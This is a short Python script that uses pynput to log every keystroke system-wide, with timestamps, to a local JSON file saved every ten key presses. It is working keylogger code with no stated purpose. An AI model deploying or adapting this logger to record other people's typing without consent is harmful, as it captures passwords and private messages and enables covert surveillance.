from pynput import keyboard
import time
import json

log_file = "keystrokes.json"
keystrokes = []

def on_press(key):
    try:
        key_str = key.char if hasattr(key, 'char') else str(key)

        # Logging keystroke with timestamps
        keystrokes.append({"key": key_str, "timestamp": time.time()})

        # Saving the file
        if len(keystrokes) % 10 == 0:
            with open(log_file, "w") as f:
                json.dump(keystrokes, f, indent=4)

    except Exception as e:
        print(f"Error: {e}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()